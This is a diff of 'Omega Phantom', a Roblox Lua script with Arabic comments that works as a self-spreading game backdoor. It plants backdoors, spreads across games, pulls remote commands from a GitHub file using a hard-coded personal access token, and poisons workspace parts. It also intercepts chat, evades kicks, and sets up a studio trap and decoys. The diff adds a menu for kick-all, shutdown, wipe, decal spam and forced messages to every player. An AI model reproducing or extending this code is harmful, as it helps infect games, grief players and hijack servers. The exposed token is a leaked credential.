@@ -33,7 +33,7 @@ local whitelistGames = {
     1962086498, 1277113435, 134236244017051, 18381724395
 }
 
--- GitHub global command file (تم تصحيح الرابط ليكون Raw دون refs/heads)
+-- GitHub global command file
 local commandUrl = "https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/main/command.txt"
 local githubToken = "Github_pat_11CCOI6GI0jTkUZmHyPtQC_dXkifJom2ddmq0cdv1bEu8RksKHYEEvF3xyFlAfb5xuDOGWSONEkuo8wHxW"
 local githubApiUrl = "https://api.github.com/repos/mebdsn78-dev/OmegaData/contents/command.txt"
@@ -203,7 +203,72 @@ local function UniversalSpread()
     return true
 end
 
--- =============================[ GLOBAL COMMANDS VIA GITHUB (CROSS-SERVER) ]=============================
+-- ========================[ دوال أساسية منقولة قبل الأوامر ]========================
+local function sendGlobalMessageToAllPlayers(msg)
+    for _, plr in pairs(Players:GetPlayers()) do
+        local gui = Instance.new("ScreenGui")
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0, 500, 0, 60)
+        frame.Position = UDim2.new(0.5, -250, 0, 10)
+        frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+        frame.BackgroundTransparency = 0.4
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(1,0,1,0)
+        label.BackgroundTransparency = 1
+        label.Text = msg
+        label.TextColor3 = Color3.fromRGB(255,50,50)
+        label.Font = Enum.Font.GothamBold
+        label.TextSize = 18
+        label.Parent = frame
+        frame.Parent = gui
+        gui.Parent = plr:FindFirstChild("PlayerGui") or CoreGui
+        task.wait(5)
+        gui:Destroy()
+    end
+end
+
+local function runDecalSpam()
+    local function exPro(root)
+        for _, v in pairs(root:GetChildren()) do
+            if v:IsA("Decal") and v.Texture ~= "rbxassetid://8408806737" then
+                v.Parent = nil
+            elseif v:IsA("BasePart") and not v:IsDescendantOf(LocalPlayer.Character) then
+                v.Material = Enum.Material.Plastic
+                v.Transparency = 0
+                for _, face in ipairs({"Front","Back","Right","Left","Top","Bottom"}) do
+                    local d = Instance.new("Decal", v)
+                    d.Texture = "rbxassetid://8408806737"
+                    d.Face = face
+                end
+            end
+            exPro(v)
+        end
+    end
+    local sky = Instance.new("Sky")
+    sky.SkyboxBk = "rbxassetid://8408806737"
+    sky.SkyboxDn = "rbxassetid://8408806737"
+    sky.SkyboxFt = "rbxassetid://8408806737"
+    sky.SkyboxLf = "rbxassetid://8408806737"
+    sky.SkyboxRt = "rbxassetid://8408806737"
+    sky.SkyboxUp = "rbxassetid://8408806737"
+    sky.Parent = Lighting
+    Lighting.TimeOfDay = 12
+    exPro(Workspace)
+    for _, v in pairs(Workspace:GetChildren()) do
+        if v:IsA("Sound") then v:Stop(); v:Destroy() end
+    end
+    local snd = Instance.new("Sound")
+    snd.SoundId = "rbxassetid://72089843969979"
+    snd.Volume = 10
+    snd.Looped = true
+    snd.Pitch = 0.2
+    snd.Parent = Workspace
+    snd:Play()
+    task.wait(0.1)
+    snd:Play()
+end
+
+-- =============================[ GLOBAL COMMANDS VIA GITHUB ]=============================
 local function getFileSha()
     local headers = {["Authorization"] = "token " .. githubToken, ["User-Agent"] = "OmegaPhantom"}
     local success, response = pcall(function() return HttpService:GetAsync(githubApiUrl, headers) end)
@@ -234,7 +299,6 @@ local function sendCommandToGitHub(command)
     end
 end
 
--- ====== [ NEW ] وظيفة جلب الأوامر من GitHub بطريقة احترافية وتجاهل كلمة "امر" أو "command" ======
 local function fetchGlobalCommand()
     local success, result = pcall(function()
         return HttpService:RequestAsync({
@@ -249,10 +313,10 @@ local function fetchGlobalCommand()
     if success and result.Success then
         print("command: " .. result.Body)
         local raw = result.Body
-        -- تجاهل كلمة "امر" أو "command" واستخراج الأمر الذي يليهما فقط
-        local cmd = raw:match("^%s*امر%s+(.+)$") or raw:match("^%s*command%s+(.+)$") or raw
-        cmd = cmd:gsub("%s+", "")  -- تنظيف أي مسافات زائدة
-        return cmd
+        raw = raw:gsub("%s+", " ")
+        local cmd = raw:match("امر%s+([%a]+)") or raw:match("command%s+([%a]+)") or raw:match("([%a]+)")
+        if not cmd then cmd = "" end
+        return cmd:lower()
     else
         warn("فشل الجلب العميق: " .. tostring(result and result.StatusCode or "Unknown Error"))
         return ""
@@ -398,71 +462,7 @@ local function PlantBackdoor()
     return true
 end
 
-local function sendGlobalMessageToAllPlayers(msg)
-    for _, plr in pairs(Players:GetPlayers()) do
-        local gui = Instance.new("ScreenGui")
-        local frame = Instance.new("Frame")
-        frame.Size = UDim2.new(0, 500, 0, 60)
-        frame.Position = UDim2.new(0.5, -250, 0, 10)
-        frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
-        frame.BackgroundTransparency = 0.4
-        local label = Instance.new("TextLabel")
-        label.Size = UDim2.new(1,0,1,0)
-        label.BackgroundTransparency = 1
-        label.Text = msg
-        label.TextColor3 = Color3.fromRGB(255,50,50)
-        label.Font = Enum.Font.GothamBold
-        label.TextSize = 18
-        label.Parent = frame
-        frame.Parent = gui
-        gui.Parent = plr:FindFirstChild("PlayerGui") or CoreGui
-        task.wait(5)
-        gui:Destroy()
-    end
-end
-
-local function runDecalSpam()
-    local function exPro(root)
-        for _, v in pairs(root:GetChildren()) do
-            if v:IsA("Decal") and v.Texture ~= "rbxassetid://8408806737" then
-                v.Parent = nil
-            elseif v:IsA("BasePart") and not v:IsDescendantOf(LocalPlayer.Character) then
-                v.Material = Enum.Material.Plastic
-                v.Transparency = 0
-                for _, face in ipairs({"Front","Back","Right","Left","Top","Bottom"}) do
-                    local d = Instance.new("Decal", v)
-                    d.Texture = "rbxassetid://8408806737"
-                    d.Face = face
-                end
-            end
-            exPro(v)
-        end
-    end
-    local sky = Instance.new("Sky")
-    sky.SkyboxBk = "rbxassetid://8408806737"
-    sky.SkyboxDn = "rbxassetid://8408806737"
-    sky.SkyboxFt = "rbxassetid://8408806737"
-    sky.SkyboxLf = "rbxassetid://8408806737"
-    sky.SkyboxRt = "rbxassetid://8408806737"
-    sky.SkyboxUp = "rbxassetid://8408806737"
-    sky.Parent = Lighting
-    Lighting.TimeOfDay = 12
-    exPro(Workspace)
-    for _, v in pairs(Workspace:GetChildren()) do
-        if v:IsA("Sound") then v:Stop(); v:Destroy() end
-    end
-    local snd = Instance.new("Sound")
-    snd.SoundId = "rbxassetid://72089843969979"
-    snd.Volume = 10
-    snd.Looped = true
-    snd.Pitch = 0.2
-    snd.Parent = Workspace
-    snd:Play()
-    task.wait(0.1)
-    snd:Play()
-end
-
--- =============================[ POISON ASSETS (FIXED - NO TouchTransmitter) ]=============================
+-- =============================[ POISON ASSETS ]=============================
 local function poisonAssets()
     for _, part in pairs(Workspace:GetDescendants()) do
         if part:IsA("BasePart") and not part:FindFirstChild("PoisonTouch") then
@@ -594,7 +594,7 @@ local function ChatIntercept()
     end)
 end
 
--- =============================[ GUI WITH STATUS LABEL & REAL FEEDBACK ]=============================
+-- =============================[ NEW ELEGANT DRAGGABLE GUI WITH ALL COMMANDS ]=============================
 local function CreateMenuGUI()
     local gui = Instance.new("ScreenGui")
     gui.Name = "OmegaMenu"
@@ -616,125 +616,213 @@ local function CreateMenuGUI()
     end
 
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 280, 0, 370)
-    frame.Position = UDim2.new(0.5, -140, 0.5, -185)
+    frame.Name = "MainFrame"
+    frame.Size = UDim2.new(0, 300, 0, 440)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -220)
     frame.BackgroundColor3 = Color3.fromRGB(15,15,30)
     frame.BackgroundTransparency = 0.1
+    frame.BorderSizePixel = 0
     frame.Parent = gui
-    local corner = Instance.new("UICorner")
+
+    local corner = Instance.new("UICorner", frame)
     corner.CornerRadius = UDim.new(0, 12)
-    corner.Parent = frame
 
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1,0,0,30)
-    title.BackgroundColor3 = Color3.fromRGB(25,25,50)
-    title.Text = "⚡ OMEGA PHANTOM MENU ⚡"
-    title.TextColor3 = Color3.fromRGB(255,100,100)
-    title.Font = Enum.Font.GothamBold
-    title.TextSize = 14
-    title.Parent = frame
+    -- شريط العنوان
+    local titleBar = Instance.new("Frame")
+    titleBar.Name = "TitleBar"
+    titleBar.Size = UDim2.new(1, 0, 0, 34)
+    titleBar.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+    titleBar.BorderSizePixel = 0
+    titleBar.Parent = frame
 
-    local btnSpread = Instance.new("TextButton")
-    btnSpread.Size = UDim2.new(0.8,0,0,40)
-    btnSpread.Position = UDim2.new(0.5,-120,0,50)
-    btnSpread.BackgroundColor3 = Color3.fromRGB(200,50,50)
-    btnSpread.Text = "🌌 UNIVERSAL SPREAD"
-    btnSpread.TextColor3 = Color3.fromRGB(255,255,255)
-    btnSpread.Font = Enum.Font.GothamBold
-    btnSpread.TextSize = 14
-    btnSpread.Parent = frame
+    local titleCorner = Instance.new("UICorner", titleBar)
+    titleCorner.CornerRadius = UDim.new(0, 12)
 
-    local btnPlant = Instance.new("TextButton")
-    btnPlant.Size = UDim2.new(0.8,0,0,40)
-    btnPlant.Position = UDim2.new(0.5,-120,0,100)
-    btnPlant.BackgroundColor3 = Color3.fromRGB(80,80,120)
-    btnPlant.Text = "🌱 PLANT BACKDOOR"
-    btnPlant.TextColor3 = Color3.fromRGB(255,255,255)
-    btnPlant.Font = Enum.Font.GothamBold
-    btnPlant.TextSize = 14
-    btnPlant.Parent = frame
+    local titleText = Instance.new("TextLabel")
+    titleText.Size = UDim2.new(1, -30, 1, 0)
+    titleText.Position = UDim2.new(0, 12, 0, 0)
+    titleText.BackgroundTransparency = 1
+    titleText.Text = "⚡ OMEGA PHANTOM ⚡"
+    titleText.TextColor3 = Color3.fromRGB(255,255,255)
+    titleText.Font = Enum.Font.GothamBold
+    titleText.TextSize = 16
+    titleText.TextXAlignment = Enum.TextXAlignment.Left
+    titleText.Parent = titleBar
 
-    local btnDecal = Instance.new("TextButton")
-    btnDecal.Size = UDim2.new(0.8,0,0,40)
-    btnDecal.Position = UDim2.new(0.5,-120,0,150)
-    btnDecal.BackgroundColor3 = Color3.fromRGB(80,80,120)
-    btnDecal.Text = "🎨 DECAL SPAM"
-    btnDecal.TextColor3 = Color3.fromRGB(255,255,255)
-    btnDecal.Font = Enum.Font.GothamBold
-    btnDecal.TextSize = 14
-    btnDecal.Parent = frame
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, 30, 0, 30)
+    closeBtn.Position = UDim2.new(1, -30, 0, 2)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(220,60,60)
+    closeBtn.Text = "✕"
+    closeBtn.TextColor3 = Color3.fromRGB(255,255,255)
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.TextSize = 16
+    closeBtn.Parent = titleBar
+    closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
 
+    -- آلية السحب
+    local UserInputService = game:GetService("UserInputService")
+    local dragging, dragStart, frameStart = false, Vector2.new(0,0), frame.Position
+    titleBar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            frameStart = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(
+                frameStart.X.Scale, frameStart.X.Offset + delta.X,
+                frameStart.Y.Scale, frameStart.Y.Offset + delta.Y
+            )
+        end
+    end)
+
+    -- حاوية الأزرار
+    local buttonContainer = Instance.new("ScrollingFrame")
+    buttonContainer.Size = UDim2.new(1, -10, 1, -50)
+    buttonContainer.Position = UDim2.new(0, 5, 0, 40)
+    buttonContainer.BackgroundTransparency = 1
+    buttonContainer.ScrollBarThickness = 4
+    buttonContainer.ScrollBarImageColor3 = Color3.fromRGB(100,100,100)
+    buttonContainer.CanvasSize = UDim2.new(0,0,0,0) -- سيتم ضبطه تلقائيا
+    buttonContainer.Parent = frame
+
+    local layout = Instance.new("UIGridLayout")
+    layout.CellSize = UDim2.new(0, 88, 0, 34)
+    layout.CellPadding = UDim2.new(0, 6, 0, 6)
+    layout.FillDirection = Enum.FillDirection.Horizontal
+    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    layout.VerticalAlignment = Enum.VerticalAlignment.Top
+    layout.Parent = buttonContainer
+
+    -- شريط الحالة
     local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(0.8,0,0,50)
-    statusLabel.Position = UDim2.new(0.5,-120,0,210)
-    statusLabel.BackgroundColor3 = Color3.fromRGB(30,30,55)
-    statusLabel.Text = "Ready"
+    statusLabel.Size = UDim2.new(1, -10, 0, 26)
+    statusLabel.BackgroundColor3 = Color3.fromRGB(25,25,45)
+    statusLabel.Text = "جاهز"
     statusLabel.TextColor3 = Color3.fromRGB(200,200,200)
     statusLabel.Font = Enum.Font.GothamMedium
-    statusLabel.TextSize = 11
-    statusLabel.Parent = frame
+    statusLabel.TextSize = 12
+    statusLabel.Parent = buttonContainer
+    statusLabel.LayoutOrder = 999
 
-    local close = Instance.new("TextButton")
-    close.Size = UDim2.new(0,40,0,30)
-    close.Position = UDim2.new(1,-45,1,-40)
-    close.BackgroundColor3 = Color3.fromRGB(80,80,120)
-    close.Text = "X"
-    close.TextColor3 = Color3.fromRGB(255,255,255)
-    close.Font = Enum.Font.GothamBold
-    close.TextSize = 12
-    close.Parent = frame
-    close.MouseButton1Click:Connect(function() gui:Destroy() end)
+    -- تعريف الأزرار
+    local commands = {
+        {name = "Fly", cmd = "fly"},
+        {name = "NoClip", cmd = "noclip"},
+        {name = "Heal", cmd = "heal"},
+        {name = "God", cmd = "godmode"},
+        {name = "Wipe", cmd = "wipe"},
+        {name = "Image", cmd = "image"},
+        {name = "Music", cmd = "music"},
+        {name = "KickAll", cmd = "kickall"},
+        {name = "Shutdown", cmd = "shutdown"},
+        {name = "Color", cmd = "color"},
+        {name = "Universe", cmd = "universe"},
+        {name = "Auto", cmd = "auto"},
+        {name = "Plant", cmd = "plant"},
+        {name = "Decal", cmd = "decalspam"},
+        {name = "List", cmd = "list"},
+    }
 
-    btnSpread.MouseButton1Click:Connect(function()
-        if infectionActive then
-            autoSpreadEnabled = true
-            statusLabel.Text = "Starting spread..."
+    for _, cmdInfo in ipairs(commands) do
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(0, 88, 0, 34)
+        btn.BackgroundColor3 = Color3.fromRGB(170, 40, 40)
+        btn.Text = cmdInfo.name
+        btn.TextColor3 = Color3.fromRGB(255,255,255)
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 13
+        btn.Parent = buttonContainer
+
+        local btnCorner = Instance.new("UICorner", btn)
+        btnCorner.CornerRadius = UDim.new(0, 6)
+
+        btn.MouseButton1Click:Connect(function()
+            statusLabel.Text = "تنفيذ: " .. cmdInfo.name
             statusLabel.TextColor3 = Color3.fromRGB(255,200,100)
-            task.spawn(function()
-                print("[GUI] Universal spread button pressed.")
-                UniversalSpread()
-                statusLabel.Text = "Spread completed! Check console."
+            if cmdInfo.cmd == "plant" then
+                local success = PlantBackdoor()
+                if success then
+                    infectionActive = true
+                    statusLabel.Text = "تم زرع الباب الخلفي!"
+                    statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
+                else
+                    statusLabel.Text = "فشل الزرع!"
+                    statusLabel.TextColor3 = Color3.fromRGB(255,80,80)
+                end
+            elseif cmdInfo.cmd == "universe" then
+                autoSpreadEnabled = true
+                task.spawn(UniversalSpread)
+                statusLabel.Text = "الانتشار الشامل بدأ..."
                 statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
-            end)
-        else
-            statusLabel.Text = "Plant backdoor first!"
-            statusLabel.TextColor3 = Color3.fromRGB(255,100,100)
-            print("[GUI] Spread prevented: backdoor not planted.")
-        end
-    end)
-
-    btnPlant.MouseButton1Click:Connect(function()
-        statusLabel.Text = "Planting backdoor..."
-        statusLabel.TextColor3 = Color3.fromRGB(255,200,100)
-        print("[GUI] Manual backdoor planting requested.")
-        local success = PlantBackdoor()
-        if success then
-            infectionActive = true
-            statusLabel.Text = "Backdoor planted!"
-            statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
-            print("[GUI] ✅ Backdoor successfully planted.")
-        else
-            statusLabel.Text = "Failed to plant."
-            statusLabel.TextColor3 = Color3.fromRGB(255,80,80)
-            warn("[GUI] ❌ Backdoor planting failed.")
-        end
-    end)
-
-    btnDecal.MouseButton1Click:Connect(function()
-        statusLabel.Text = "Running decal spam..."
-        statusLabel.TextColor3 = Color3.fromRGB(255,200,100)
-        task.spawn(function()
-            runDecalSpam()
-            statusLabel.Text = "Decal spam executed."
-            statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
+            elseif cmdInfo.cmd == "auto" then
+                autoSpreadEnabled = not autoSpreadEnabled
+                statusLabel.Text = "الانتشار التلقائي: " .. (autoSpreadEnabled and "ON" or "OFF")
+                statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
+            else
+                task.spawn(executeCommand, cmdInfo.cmd)
+                statusLabel.Text = "تم: " .. cmdInfo.name
+                statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
+            end
         end)
+    end
+
+    -- مربع رسالة مخصصة
+    local msgFrame = Instance.new("Frame")
+    msgFrame.Size = UDim2.new(1, -10, 0, 36)
+    msgFrame.BackgroundTransparency = 1
+    msgFrame.Parent = buttonContainer
+    msgFrame.LayoutOrder = 998
+
+    local msgInput = Instance.new("TextBox")
+    msgInput.Size = UDim2.new(1, -60, 0, 34)
+    msgInput.Position = UDim2.new(0, 0, 0, 0)
+    msgInput.BackgroundColor3 = Color3.fromRGB(40,40,60)
+    msgInput.Text = ""
+    msgInput.PlaceholderText = "رسالة مخصصة..."
+    msgInput.TextColor3 = Color3.fromRGB(255,255,255)
+    msgInput.Font = Enum.Font.GothamMedium
+    msgInput.TextSize = 12
+    msgInput.Parent = msgFrame
+
+    local sendMsgBtn = Instance.new("TextButton")
+    sendMsgBtn.Size = UDim2.new(0, 55, 0, 34)
+    sendMsgBtn.Position = UDim2.new(1, -55, 0, 0)
+    sendMsgBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+    sendMsgBtn.Text = "إرسال"
+    sendMsgBtn.TextColor3 = Color3.fromRGB(255,255,255)
+    sendMsgBtn.Font = Enum.Font.GothamBold
+    sendMsgBtn.TextSize = 12
+    sendMsgBtn.Parent = msgFrame
+    sendMsgBtn.MouseButton1Click:Connect(function()
+        local txt = msgInput.Text
+        if txt ~= "" then
+            sendGlobalMessageToAllPlayers(txt)
+            statusLabel.Text = "تم إرسال الرسالة"
+            statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
+            msgInput.Text = ""
+        end
     end)
 
-    print("[GUI] Omega Menu created successfully with real-time console feedback.")
+    -- ضبط حجم Canvas تلقائياً
+    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        buttonContainer.CanvasSize = UDim2.new(0, layout.AbsoluteContentSize.X, 0, layout.AbsoluteContentSize.Y + 40)
+    end)
+
+    print("[GUI] Omega Menu created successfully with all commands & smooth drag.")
     return true
 end
 
--- =============================[ SLOW BURN AUTOMATION (NO MESSAGING SERVICE) ]=============================
+-- =============================[ SLOW BURN AUTOMATION ]=============================
 local function startSlowBurn()
     task.spawn(function()
         while true do
@@ -749,6 +837,7 @@ end
 -- =============================[ MAIN LAUNCH ]=============================
 local function Launch()
     AntiKick()
+    AntiTimeOut()
     setupStudioTrap(script)
     createDecoy()
     setupFragments()
